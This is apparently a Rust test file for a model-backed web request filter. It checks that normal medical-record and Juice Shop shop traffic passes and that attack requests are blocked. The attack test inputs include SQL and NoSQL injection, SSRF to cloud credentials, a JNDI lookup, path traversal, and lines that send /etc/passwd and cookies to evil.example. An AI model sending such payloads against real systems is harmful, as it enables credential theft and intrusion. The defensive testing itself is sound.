//! docs/04 section 4.4 "real Jev": the acceptance scenarios against the live
//! model. Ignored by default because it needs a key and the network:
//!
//! ```text
//! XSHIELD_JEV_ROUTE=direct XSHIELD_JEV_API_KEY=... \
//!   cargo test -p xshield-judge --test live_jev -- --ignored --nocapture
//! ```
//!
//! It prints one line per scenario and fails when any verdict differs from
//! the expectation, so the output is the misjudgement record.

#![allow(clippy::too_many_lines)]

use xshield_core::context::{DecisionPath, Outcome, SiteSpec};
use xshield_judge::context::ContextKey;
use xshield_judge::engine::{Judge, Observation, RequestFacts};
use xshield_judge::jev::JevClient;

/// The gateway id of the origin responses the scenarios observe.
const RID: &str = "req_00000000000000000000000000000001";

struct Case {
    name: &'static str,
    method: &'static str,
    path: &'static str,
    query: Option<&'static str>,
    body: &'static str,
    session: Option<&'static str>,
    expect_block: bool,
}

fn get(
    name: &'static str,
    path: &'static str,
    query: Option<&'static str>,
    session: Option<&'static str>,
    expect_block: bool,
) -> Case {
    Case {
        name,
        method: "GET",
        path,
        query,
        body: "",
        session,
        expect_block,
    }
}

fn post(
    name: &'static str,
    path: &'static str,
    body: &'static str,
    session: Option<&'static str>,
    expect_block: bool,
) -> Case {
    Case {
        name,
        method: "POST",
        path,
        query: None,
        body,
        session,
        expect_block,
    }
}

fn site() -> SiteSpec {
    SiteSpec::from_json(
        r#"{"name":"emr","hosts":["emr.test"],"origin":"http://o:1","session":{"cookie":"SID"},
            "entries":["/login","/api/home","/api/patients","/api/share/redeem"],
            "bypass":["/static/*"],"mode":"enforce"}"#,
    )
    .expect("site")
}

/// Business traffic that must pass and attack variants that must not, on a
/// session that has only seen the patient list.
#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_business_traffic_and_evasions() {
    let judge = Judge::new(
        ContextKey::new(vec![4; 32]),
        JevClient::from_environment().expect("Jev configuration"),
    );
    let site = site();
    judge.observe(
        &site,
        &Observation {
            request_id: RID,
            unread: None,
            would_block: false,
            credential: Some("doctorA"),
            client: "10.0.0.1",
            issued_credential: None,
            method: "GET",
            path: "/api/patients",
            status: 200,
            content_type: Some("application/json"),
            body: br#"{"patients":[{"id":"7f3a91c2","name":"Zhang Wei","age":54}]}"#,
            now_ms: 1_000,
        },
    );
    let cases = [
        post(
            "new patient",
            "/api/patients",
            r#"{"name":"Chen Yu","birthday":"1990-04-12","phone":"13800138000","note":"首次就诊，主诉头痛三天"}"#,
            Some("doctorA"),
            false,
        ),
        post(
            "prescription",
            "/api/prescriptions",
            r#"{"patient_id":"7f3a91c2","drug":"Amlodipine 5mg","dose":"1 tablet daily","days":14}"#,
            Some("doctorA"),
            false,
        ),
        get(
            "paging",
            "/api/patients",
            Some("page=2&size=20&sort=name"),
            Some("doctorA"),
            false,
        ),
        get(
            "search chinese",
            "/api/patients",
            Some("q=%E5%BC%A0%E4%BC%9F"),
            Some("doctorA"),
            false,
        ),
        get(
            "date filter",
            "/api/appointments",
            Some("from=2025-01-01&to=2025-01-31&status=confirmed"),
            Some("doctorA"),
            false,
        ),
        post(
            "apostrophe name",
            "/api/notes",
            r#"{"title":"O'Brien follow-up","text":"Patient's wife called; don't reschedule."}"#,
            Some("doctorA"),
            false,
        ),
        post(
            "sql words in prose",
            "/api/notes",
            r#"{"title":"Please select the correct union rep","text":"Drop me a line to update the schedule."}"#,
            Some("doctorA"),
            false,
        ),
        post(
            "login",
            "/login",
            "username=dr.zhang&password=C0rrect-Horse-Battery",
            None,
            false,
        ),
        get(
            "seen id with sub path",
            "/api/patients/7f3a91c2/records",
            Some("type=lab"),
            Some("doctorA"),
            false,
        ),
        get(
            "blind sql",
            "/api/patients/7f3a91c2",
            Some("id=1%20AND%20SLEEP(5)"),
            Some("doctorA"),
            true,
        ),
        get(
            "sql comment bypass",
            "/api/patients",
            Some("q=admin%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%23"),
            Some("doctorA"),
            true,
        ),
        post(
            "nosql injection",
            "/login",
            r#"{"username":{"$ne":null},"password":{"$ne":null}}"#,
            None,
            true,
        ),
        post(
            "ssrf",
            "/api/import",
            r#"{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}"#,
            Some("doctorA"),
            true,
        ),
        post(
            "template injection",
            "/api/notes",
            r#"{"title":"{{7*7}}","text":"${jndi:ldap://evil.example/a}"}"#,
            Some("doctorA"),
            true,
        ),
        get(
            "backtick command",
            "/api/export",
            Some("file=report%60id%60.pdf"),
            Some("doctorA"),
            true,
        ),
        get(
            "idor numeric guess",
            "/api/patients/1002",
            None,
            Some("doctorA"),
            true,
        ),
        get(
            "idor via record id",
            "/api/records/99812",
            None,
            Some("doctorA"),
            true,
        ),
        post(
            "mass assignment role",
            "/api/profile",
            r#"{"display_name":"Zhang","role":"admin","owner_id":"other-doctor-9"}"#,
            Some("doctorA"),
            true,
        ),
    ];
    run(&judge, &site, &cases, 5_000).await;
}

#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_acceptance_scenarios() {
    let client = JevClient::from_environment().expect("Jev configuration");
    let judge = Judge::new(ContextKey::new(vec![3; 32]), client);
    let site = site();

    // Doctor A listed patients B and C; doctor B's patient D was never shown.
    let list = br#"{"patients":[{"id":"7f3a91c2","name":"Zhang Wei","age":54},{"id":"c04d55e8","name":"Li Na","age":31}]}"#;
    for session in ["doctorA", "doctorA2"] {
        judge.observe(
            &site,
            &Observation {
                request_id: RID,
                unread: None,
                would_block: false,
                credential: Some(session),
                client: "10.0.0.1",
                issued_credential: None,
                method: "GET",
                path: "/api/patients",
                status: 200,
                content_type: Some("application/json"),
                body: list,
                now_ms: 1_000,
            },
        );
    }
    // A share code redeemed by the recipient shows them patient A's record.
    judge.observe(
        &site,
        &Observation {
            request_id: RID,
            unread: None,
            would_block: false,
            credential: Some("recipient"),
            client: "10.0.0.1",
            issued_credential: None,
            method: "POST",
            path: "/api/share/redeem",
            status: 200,
            content_type: Some("application/json"),
            body: br#"{"patient":{"id":"a91be0d4","name":"Wang Fang"}}"#,
            now_ms: 1_100,
        },
    );

    let cases = [
        get(
            "A1 listed patient",
            "/api/patients/7f3a91c2",
            None,
            Some("doctorA"),
            false,
        ),
        get(
            "A2 other doctor's patient",
            "/api/patients/e5170b3a",
            None,
            Some("doctorA"),
            true,
        ),
        get(
            "A3 fresh session opens patient",
            "/api/patients/7f3a91c2",
            None,
            Some("stranger"),
            true,
        ),
        Case {
            name: "A4 delete unseen patient",
            method: "DELETE",
            path: "/api/patients/e5170b3a",
            query: None,
            body: "",
            session: Some("doctorA"),
            expect_block: true,
        },
        get(
            "A5 foreign doctor parameter",
            "/api/patients",
            Some("doctor=other-doctor-9"),
            Some("doctorA"),
            true,
        ),
        get(
            "A6 shared patient after redeem",
            "/api/patients/a91be0d4",
            None,
            Some("recipient"),
            false,
        ),
        get(
            "A7 shared patient without redeem",
            "/api/patients/a91be0d4",
            None,
            Some("doctorA2"),
            true,
        ),
        post(
            "B1 chinese note",
            "/api/notes",
            r#"{"title":"复诊记录","text":"患者今日血压稳定，继续服药，两周后复查。"}"#,
            Some("doctorA"),
            false,
        ),
        post(
            "B1 english search",
            "/api/search",
            r#"{"q":"blood pressure follow up"}"#,
            Some("doctorA"),
            false,
        ),
        get(
            "B2 sql injection",
            "/api/patients/7f3a91c2",
            Some("q=1%27%20OR%20%271%27%3D%271%27%3B%20DROP%20TABLE%20patients--"),
            Some("doctorA"),
            true,
        ),
        get(
            "B2 union select",
            "/api/patients/7f3a91c2",
            Some("sort=name%20UNION%20SELECT%20password%20FROM%20users"),
            Some("doctorA"),
            true,
        ),
        post(
            "B2 command execution",
            "/api/notes",
            r#"{"title":"x","text":"; cat /etc/passwd | nc evil.example 4444"}"#,
            Some("doctorA"),
            true,
        ),
        get(
            "B2 path traversal",
            "/api/files",
            Some("name=..%2F..%2F..%2Fetc%2Fshadow"),
            Some("doctorA"),
            true,
        ),
        post(
            "B2 script injection",
            "/api/notes",
            r#"{"title":"<script>fetch('//evil.example/?c='+document.cookie)</script>","text":"hi"}"#,
            Some("doctorA"),
            true,
        ),
    ];
    run(&judge, &site, &cases, 2_000).await;
}

async fn run(judge: &Judge<JevClient>, site: &SiteSpec, cases: &[Case], start_ms: u64) {
    let mut wrong = Vec::new();
    for (index, case) in cases.iter().enumerate() {
        let request_id = format!("live{index}");
        let judgement = judge
            .judge(
                site,
                &RequestFacts {
                    request_id: &request_id,
                    method: case.method,
                    path: case.path,
                    query: case.query,
                    content_type: (!case.body.is_empty()).then_some("application/json"),
                    body: case.body.as_bytes(),
                    credential: case.session,
                    client: "10.0.0.1",
                    now_ms: start_ms + u64::try_from(index).unwrap_or(0),
                },
            )
            .await;
        let record = judgement.record;
        let blocked = !judgement.forward;
        let detail = record.jev.as_ref().map_or_else(
            || "no model call".to_owned(),
            |jev| {
                format!(
                    "{}ms access={:?} attack={:?} failure={:?}",
                    jev.millis, jev.access, jev.attack, jev.failure
                )
            },
        );
        println!(
            "{:<34} blocked={:<5} expected={:<5} {:?}/{:?}  {}",
            case.name, blocked, case.expect_block, record.decision_path, record.outcome, detail
        );
        if blocked != case.expect_block {
            if let Some(jev) = &record.jev {
                println!("  state sent: {}", jev.state.as_deref().unwrap_or("none"));
            }
            wrong.push(case.name);
        }
        assert!(
            record.decision_path != DecisionPath::JevUnavailable
                || record.outcome != Outcome::Unjudged,
            "the live provider must answer"
        );
    }
    assert!(
        wrong.is_empty(),
        "verdicts differ from the expectation: {wrong:?}"
    );
}

/// The Juice Shop checkout flow recorded on the Windows trial (docs/04 section
/// 4.5): camel-case route names, small numeric ids and card fields that the
/// first trial answered DENY for although every id had been shown. The
/// checkout POST is covered too: `paymentId` 7 was shown only as a card id.
#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_juice_shop_checkout_flow() {
    let judge = Judge::new(
        ContextKey::new(vec![5; 32]),
        JevClient::from_environment().expect("Jev configuration"),
    );
    let site = SiteSpec::from_json(
        r#"{"name":"juice","hosts":["juice.test"],"origin":"http://o:1","session":{"cookie":"token"},
            "entries":["/","/rest/user/login","/rest/products/search"],
            "bypass":["/assets/*"],"mode":"enforce"}"#,
    )
    .expect("site");
    let observe = |path: &'static str, body: &'static [u8], now_ms: u64| {
        judge.observe(
            &site,
            &Observation {
                request_id: RID,
                unread: None,
                would_block: false,
                credential: Some("tokenA"),
                client: "10.0.0.1",
                issued_credential: None,
                method: "GET",
                path,
                status: 200,
                content_type: Some("application/json"),
                body,
                now_ms,
            },
        );
    };
    observe(
        "/rest/basket/22",
        br#"{"status":"success","data":{"id":22,"coupon":null,"UserId":24,"Products":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99,"BasketItem":{"id":9,"quantity":1,"BasketId":22,"ProductId":1}}]}}"#,
        1_000,
    );
    observe(
        "/rest/products/search",
        br#"{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99},{"id":2,"name":"Orange Juice (1000ml)","price":2.99}]}"#,
        999,
    );
    observe(
        "/api/Quantitys/",
        br#"{"status":"success","data":[{"ProductId":1,"id":1,"quantity":138},{"ProductId":2,"id":2,"quantity":8}]}"#,
        1_001,
    );
    observe(
        "/api/Addresss",
        br#"{"status":"success","data":[{"id":7,"fullName":"Test User","zipCode":"10001","city":"NYC","UserId":24}]}"#,
        1_002,
    );
    observe(
        "/api/Deliverys",
        br#"{"status":"success","data":[{"id":1,"name":"One Day Delivery","price":0.99,"eta":1},{"id":2,"name":"Fast Delivery","price":0.5,"eta":3}]}"#,
        1_003,
    );
    observe(
        "/api/Cards",
        br#"{"status":"success","data":[{"id":7,"fullName":"Test User","cardNum":4111111111111111}]}"#,
        1_004,
    );
    let cases = [
        get(
            "address by shown id",
            "/api/Addresss/7",
            None,
            Some("tokenA"),
            false,
        ),
        get(
            "delivery by shown id",
            "/api/Deliverys/1",
            None,
            Some("tokenA"),
            false,
        ),
        get(
            "card by shown id",
            "/api/Cards/7",
            None,
            Some("tokenA"),
            false,
        ),
        get(
            "basket item by shown id",
            "/api/BasketItems/9",
            None,
            Some("tokenA"),
            false,
        ),
        post(
            "add card form",
            "/api/Cards/",
            r#"{"fullName":"Test User","cardNum":4111111111111111,"expMonth":2,"expYear":2099}"#,
            Some("tokenA"),
            false,
        ),
        get("address list", "/api/Addresss", None, Some("tokenA"), false),
        get(
            "delivery list",
            "/api/Deliverys",
            None,
            Some("tokenA"),
            false,
        ),
        get("card list", "/api/Cards", None, Some("tokenA"), false),
        get(
            "quantity list",
            "/api/Quantitys/",
            None,
            Some("tokenA"),
            false,
        ),
        get(
            "product by shown id",
            "/api/Products/1",
            Some("d=Sun%20Nov%2001%202026"),
            Some("tokenA"),
            false,
        ),
        post(
            "add to own basket",
            "/api/BasketItems/",
            r#"{"ProductId":1,"BasketId":"22","quantity":1}"#,
            Some("tokenA"),
            false,
        ),
        post(
            "add to someone else's basket",
            "/api/BasketItems/",
            r#"{"ProductId":1,"BasketId":"1","quantity":1}"#,
            Some("tokenA"),
            true,
        ),
        get(
            "user by name never shown",
            "/api/users/Alice",
            None,
            Some("tokenA"),
            true,
        ),
        post(
            "neutral key names another account",
            "/rest/wallet/transfer",
            r#"{"to":"user-1042","amount":5}"#,
            Some("tokenA"),
            true,
        ),
        get(
            "basket of someone else",
            "/rest/basket/1",
            None,
            Some("tokenA"),
            true,
        ),
        get(
            "address never shown",
            "/api/Addresss/3",
            None,
            Some("tokenA"),
            true,
        ),
        get(
            "card never shown",
            "/api/Cards/12",
            None,
            Some("tokenA"),
            true,
        ),
        post(
            "checkout own basket",
            "/rest/basket/22/checkout",
            r#"{"couponData":"bnVsbA==","orderDetails":{"paymentId":"7","addressId":"7","deliveryMethodId":"1"}}"#,
            Some("tokenA"),
            false,
        ),
        post(
            "checkout foreign basket",
            "/rest/basket/1/checkout",
            r#"{"couponData":"bnVsbA==","orderDetails":{"paymentId":"7","addressId":"7","deliveryMethodId":"1"}}"#,
            Some("tokenA"),
            true,
        ),
    ];
    run(&judge, &site, &cases, 2_000).await;
}

/// The Juice Shop sign-up flow: a client without a session is shown the
/// security questions and the id of the user it just created, then answers
/// with both. The first third Windows round judged that DENY.
#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_juice_shop_sign_up_flow() {
    let judge = Judge::new(
        ContextKey::new(vec![6; 32]),
        JevClient::from_environment().expect("Jev configuration"),
    );
    let site = SiteSpec::from_json(
        r#"{"name":"juice","hosts":["juice.test"],"origin":"http://o:1","session":{"cookie":"token"},
            "entries":["/","/rest/user/login","/api/Users/","/api/SecurityQuestions/","/api/SecurityAnswers/"],
            "bypass":["/assets/*"],"mode":"enforce"}"#,
    )
    .expect("site");
    for (method, path, body, now_ms) in [
        (
            "GET",
            "/api/SecurityQuestions/",
            br#"{"status":"success","data":[{"id":1,"question":"Your eldest siblings middle name?"},{"id":2,"question":"Mother's maiden name?"}]}"#.as_slice(),
            1_000,
        ),
        (
            "POST",
            "/api/Users/",
            br#"{"status":"success","data":{"id":52,"email":"new.user@example.com","role":"customer","isActive":true}}"#.as_slice(),
            1_001,
        ),
    ] {
        judge.observe(
            &site,
            &Observation { request_id: RID, unread: None, would_block: false,
                credential: None,
                client: "10.0.0.1",
                issued_credential: None,
                method,
                path,
                status: 200,
                content_type: Some("application/json"),
                body,
                now_ms,
            },
        );
    }
    let cases = [
        post(
            "answer for the user just created",
            "/api/SecurityAnswers/",
            r#"{"UserId":52,"answer":"iYPJ_o3lz87lCk1v8arjsUK1","SecurityQuestionId":1}"#,
            None,
            false,
        ),
        post(
            "answer for someone else's user",
            "/api/SecurityAnswers/",
            r#"{"UserId":1,"answer":"iYPJ_o3lz87lCk1v8arjsUK1","SecurityQuestionId":1}"#,
            None,
            true,
        ),
    ];
    run(&judge, &site, &cases, 2_000).await;
}
